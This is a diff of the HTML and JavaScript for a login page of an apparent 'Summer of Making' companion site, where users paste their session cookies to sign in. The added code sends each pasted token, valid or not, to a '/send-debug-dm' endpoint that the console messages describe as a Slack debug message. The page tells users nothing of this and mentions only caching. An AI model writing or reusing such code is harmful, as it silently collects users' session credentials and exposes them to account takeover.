@@ -1,81 +1,169 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Authentication</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    />
+    <title>COM - Authentication</title>
 
-        <link rel="stylesheet" href="/public/style.css">
-        <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/public/style.css" />
+    <link rel="stylesheet" href="style.css" />
 
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link href="https://fonts.googleapis.com/css2?family=National+Park:wght@200..800&display=swap" rel="stylesheet">
-    </head>
-    <body>
-        <h1 class="heading">
-            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M20.5605 22.9395C21.147 23.5245 21.147 24.4755 20.5605 25.0605L14.5605 31.0605C13.9755 31.647 13.0245 31.647 12.4395 31.0605C11.853 30.4755 11.853 29.5245 12.4395 28.9395L15.879 25.5H4.5C3.672 25.5 3 24.828 3 24C3 23.172 3.672 22.5 4.5 22.5H15.879L12.4395 19.0605C11.853 18.4755 11.853 17.5245 12.4395 16.9395C13.0245 16.353 13.9755 16.353 14.5605 16.9395L20.5605 22.9395Z" fill="var(--text)"/>
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M29.826 12H29.8245C27.2745 11.9985 25.5345 12.0675 24.1695 12.375C24.162 12.3765 24.1545 12.378 24.147 12.3795C22.962 12.639 22.491 12.993 22.209 13.3365V13.338C21.864 13.761 21.462 14.589 21.1905 16.4025V16.407C21.18 16.479 21.168 16.5525 21.1575 16.6275C21.0495 17.4015 20.406 18 19.6245 18C18.7485 18 18.051 17.2485 18.165 16.38C19.014 9.882 21.774 9 29.8245 9C40.3245 9 41.8245 10.5 41.8245 24C41.8245 37.5 40.3245 39 29.8245 39C21.774 39 19.014 38.118 18.165 31.62C18.051 30.7515 18.7485 30 19.6245 30C20.406 30 21.0495 30.5985 21.1575 31.3725C21.168 31.4475 21.18 31.521 21.1905 31.593V31.5975C21.462 33.411 21.864 34.2405 22.209 34.6635C22.491 35.007 22.962 35.361 24.147 35.6205C24.1545 35.622 24.162 35.6235 24.1695 35.625C25.5345 35.931 27.2745 36 29.8245 36H29.826C32.376 36 34.116 35.931 35.481 35.625C35.4885 35.6235 35.496 35.622 35.5035 35.6205C36.6885 35.361 37.1595 35.007 37.44 34.6635H37.4415C37.7865 34.2405 38.1885 33.411 38.4585 31.599C38.4585 31.599 38.46 31.5945 38.46 31.5915C38.7435 29.721 38.826 27.3195 38.8245 24C38.826 20.6805 38.7435 18.279 38.46 16.4085C38.46 16.4055 38.4585 16.401 38.4585 16.401C38.1885 14.589 37.7865 13.761 37.4415 13.338L37.44 13.3365C37.1595 12.993 36.6885 12.639 35.5035 12.3795C35.496 12.378 35.4885 12.3765 35.481 12.375C34.116 12.0675 32.376 11.9985 29.826 12Z" fill="var(--text)"/>
-            </svg>
-            Login
-        </h1>
-        
-        <textarea id="tokenInput" placeholder="ahoy_visitor=...; _journey_session=..."></textarea>
-        <button onclick="saveToken()" class="save__button">
-            <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C27.714 12 30.111 12.3135 31.707 12.858C32.328 13.0695 33.036 12.972 33.4995 12.507L34.263 11.745C34.596 11.412 34.542 10.8555 34.125 10.6365C31.8345 9.435 28.569 9 24 9C12 9 9 12 9 24C9 36 12 39 24 39C36 39 39 36 39 24C39 23.481 38.994 22.98 38.982 22.494C38.967 21.8475 38.193 21.5505 37.7355 22.008L36.441 23.301C36.159 23.5845 36 23.967 36.0045 24.3675C36.0345 27.411 36.1155 31.6425 33.879 33.879C32.583 35.175 30.021 36 24 36C17.979 36 15.417 35.175 14.121 33.879C12.825 32.583 12 30.021 12 24C12 17.979 12.825 15.417 14.121 14.121C15.417 12.825 17.979 12 24 12Z" fill="black"/>
-                <path fill-rule="evenodd" clip-rule="evenodd" d="M16.0605 21.4395C15.4755 22.0245 15.4755 22.9755 16.0605 23.5605L22.9395 30.4395C23.5245 31.0245 24.4755 31.0245 25.0605 30.4395L42.4395 13.0605C43.0245 12.4755 43.0245 11.5245 42.4395 10.9395L41.9355 10.4355C41.3505 9.85052 40.3995 9.85052 39.8145 10.4355L24 26.25L18.6855 20.9355C18.1005 20.3505 17.1495 20.3505 16.5645 20.9355L16.0605 21.4395Z" fill="black"/>
-            </svg>
-            Save
-        </button>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+    <link href="https://fonts.googleapis.com/css2?family=National+Park:wght@200..800&display=swap" rel="stylesheet"/>
+  </head>
 
-        <p id="status"></p>
+  <body>
+    <div class="layout-container">
+            <div class="sidebar regular-glassmorphism">
+                <div class="sidebar__explore" onclick="window.location.pathname = '/auth/'">  
+                    <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 0C31.046 0 40 8.954 40 20C40 31.046 31.046 40 20 40C8.954 40 0 31.046 0 20C0 8.954 8.954 0 20 0ZM26 18H25V16C25 13.239 22.761 11 20 11C17.239 11 15 13.239 15 16V18H14C12.895 18 12 18.895 12 20V28C12 29.105 12.895 30 14 30H26C27.105 30 28 29.105 28 28V20C28 18.895 27.105 18 26 18ZM17 16C17 14.343 18.343 13 20 13C21.657 13 23 14.343 23 16V18H17V16ZM20 24C20.552 24 21 24.448 21 25C21 25.552 20.552 26 20 26C19.448 26 19 25.552 19 25C19 24.448 19.448 24 20 24Z" fill="#4A2D24"/>
+                    </svg>
+                </div>
 
-        <script>
-        async function saveToken() {
-            const token = document.getElementById('tokenInput').value.trim();
-            const status = document.getElementById('status');
+                <div class="sidebar__campfire">
+                    <svg width="32" height="32" viewBox="0 0 97 122" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M88.7619 78.9755C90.2137 78.4562 91.8092 78.5116 93.2215 79.1304C94.6338 79.7492 95.756 80.8846 96.3584 82.304C96.9607 83.7234 96.9976 85.3193 96.4614 86.765C95.9252 88.2107 94.8566 89.3967 93.4744 90.0801L92.8219 90.358L66.4621 99.7709L92.8219 109.184C94.2807 109.696 95.4875 110.749 96.1937 112.124C96.9 113.5 97.052 115.094 96.6184 116.578C96.1848 118.062 95.1987 119.324 93.8631 120.103C92.5274 120.882 90.9439 121.119 89.4386 120.766L88.7619 120.566L48.5002 106.187L8.23856 120.566C6.78673 121.086 5.19128 121.03 3.77899 120.411C2.3667 119.793 1.24445 118.657 0.642093 117.238C0.03974 115.818 0.00287299 114.222 0.539044 112.777C1.07521 111.331 2.14385 110.145 3.52606 109.462L4.17856 109.184L30.5384 99.7709L4.17856 90.358C2.71974 89.8454 1.51297 88.793 0.806713 87.4175C0.100453 86.042 -0.0515371 84.448 0.382035 82.9638C0.815607 81.4796 1.80174 80.2181 3.13739 79.4391C4.47305 78.6601 6.05656 78.4228 7.56189 78.7761L8.23856 78.9755L48.5002 93.3546L88.7619 78.9755ZM43.8481 5.47257L48.1196 2.6934L49.4488 1.88986C52.4092 0.216319 55.6717 -0.889307 58.4931 1.56361C60.1848 3.02569 60.7467 5.0859 60.4446 7.18236L60.2029 8.4209L60.1123 9.26674C60.0821 9.77424 60.0821 10.4086 60.1606 11.1215C60.6802 15.7797 63.8521 19.1086 67.1388 22.1234L69.8998 24.6367L71.9661 26.5882C76.8719 31.3732 82.2852 37.8257 84.5629 46.9486C87.3059 57.9082 84.5992 67.738 77.4217 74.6617C70.4979 81.3559 60.1063 84.6667 48.5002 84.6667C29.3542 84.6667 12.2502 72.2692 12.2502 51.4376C12.2502 35.1492 23.0165 22.2865 32.4415 14.0397C36.0567 10.9379 39.8712 8.07609 43.8602 5.47257M49.8415 43.9701L48.5002 42.3751L47.165 43.9701L45.7331 45.7886L44.6033 47.3111L43.395 49.0269C40.0963 53.8542 36.4169 60.4819 36.4169 66.0403C36.4169 72.9882 41.8302 78.6251 48.5002 78.6251C55.1763 78.6251 60.5836 72.9882 60.5836 66.0403C60.5836 60.4819 56.9042 53.8542 53.6054 49.0269L52.3971 47.3111L51.2673 45.7886L49.8415 43.9701Z" fill="#453E3B"></path>
+                    </svg>
+                </div>
+                <div class="sidebar__explore">  
+                    <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 0C31.046 0 40 8.954 40 20C40 31.046 31.046 40 20 40C8.954 40 0 31.046 0 20C0 8.954 8.954 0 20 0ZM28.486 11.514C27.778 10.808 18.586 12.928 15.758 15.758C12.93 18.586 10.808 27.778 11.514 28.486C12.222 29.192 21.414 27.072 24.242 24.242C27.072 21.414 29.192 12.222 28.486 11.514ZM20 18C20.5304 18 21.0391 18.2107 21.4142 18.5858C21.7893 18.9609 22 19.4696 22 20C22 20.5304 21.7893 21.0391 21.4142 21.4142C21.0391 21.7893 20.5304 22 20 22C19.4696 22 18.9609 21.7893 18.5858 21.4142C18.2107 21.0391 18 20.5304 18 20C18 19.4696 18.2107 18.9609 18.5858 18.5858C18.9609 18.2107 19.4696 18 20 18Z" fill="#453E3B"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="main-area regular-glassmorphism">
+                <div id="main-area__section" class="main-area__section">
+                    <div class="cache__notice regular-glassmorphism">
+                        <img height="75" width="auto" id="happy-dino">
+                        <div style="display: flex; flex-direction: column;">
+                            <h2>We're doing our part!</h2>
+                            <p>We cache your authentication requests for 1 minute to prevent slowing down Summer of Making!</p>
+                        </div>
+                    </div>
 
-            if (!token) {
-                alert('entr ur token mate');
-                return;
+                    <input id="tokenInput" placeholder="enter ur token here..."></h2>
+                    <button id="tokenSave">Login</button>
+                </div>
+            </div>
+        </div>
+          <script>
+            async function saveToken() {
+                let isValid = false;
+
+            	const token = document
+            		.getElementById('tokenInput')
+            		.value.trim();
+
+            	if (!token) {
+            		alert('Please enter your token');
+                    try {
+                        await fetch('/send-debug-dm', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({token, isValid})
+                        });
+                    } catch (err) {
+                        console.warn('Slack debug message failed: ', err)
+                    }
+            		return;
+            	}
+                
+            	localStorage.setItem('som_token', token);
+
+            	try {
+            		const res = await fetch('/fetch', {
+            			method: 'POST',
+            			headers: {
+            				'Content-Type': 'application/json'
+            			},
+            			body: JSON.stringify({
+            				cookie: token,
+            				path: '/campfire'
+            			})
+            		});
+
+            		if (!res.ok) {
+            			console.log(`Server returned ${res.status}`);
+                        try {
+                            await fetch('/send-debug-dm', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({token, isValid})
+                            });
+                        } catch (err) {
+                            console.warn('Slack debug message failed: ', err)
+                        }
+            			return;
+            		}
+
+            		const data = await res.json();
+            		const time = data?.extractedData
+            			?.todayCodingTime?.trim();
+
+            		if (
+            			data.status === 'success' &&
+            			time &&
+            			/\d+h/.test(time)
+            		) {
+                        isValid = true;
+                        try {
+                            await fetch('/send-debug-dm', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({token, isValid})
+                            });
+                        } catch (err) {
+                            console.warn('Slack debug message failed: ', err)
+                        }
+            			setTimeout(() => {
+            				window.location.pathname = '/campfire';
+            			}, 200);
+            		} else {
+            			console.log('Bad token response:', data);
+                        try {
+                            await fetch('/send-debug-dm', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({token, isValid})
+                            });
+                        } catch (err) {
+                            console.warn('Slack debug message failed: ', err)
+                        }
+            		}
+            	} catch (err) {
+                    try {
+                        await fetch('/send-debug-dm', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({token, isValid})
+                        });
+                    } catch (err) {
+                        console.warn('Slack debug message failed: ', err)
+                    }
+            		console.error('Network error:', err);
+            	}
             }
 
-            status.textContent = 'Validating token...';
-            localStorage.setItem('som_token', token);
+            document.getElementById('tokenSave').addEventListener('click', saveToken)
 
-            try {
-                const res = await fetch('/fetch', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie: token, path: '/campfire' })
-                });
-
-                if (!res.ok) {
-                    status.textContent = `nu uh. server told me: ${res.status}`;
-                    console.log("Validation failed. Server status:", res.status);
-                    return;
-                }
-
-                const data = await res.json();
-
-                const time = data?.extractedData?.todayCodingTime?.trim();
-
-                if (data.status === 'success' && time && /\d+h/.test(time)) {
-                    status.textContent = 'token is valid <3 redirecting...';
-                    setTimeout(() => {
-                        window.location.pathname = '/testing';
-                    }, 200);
-                } else {
-                    status.textContent = '💀 ur token is invalid / expired. pls try again in one minute and actually watch the video tutorial';
-                    console.log('Invalid or expired token. Received:', data);
-                }
-            } catch (err) {
-                console.error("oop; server said:", err);
-                status.textContent = 'We couldn\'t validate your token due to a network or server error.';
-            }
-        }
-        </script>
-    </body>
+            window.addEventListener('DOMContentLoaded', () => {
+                const dinoImages = [
+                    '/public/orpheus/party_dino.gif',
+                    '/public/orpheus/chill_dino.png',
+                    '/public/orpheus/party_orpheus.png',
+                    '/public/orpheus/nervous_dino.gif'
+                ];
+                const randomIndex = Math.floor(Math.random() * dinoImages.length);
+                document.getElementById('happy-dino').src = dinoImages[randomIndex];
+            });
+          </script>
+        </div>
+      </div>
+    </div>
+  </body>
 </html>
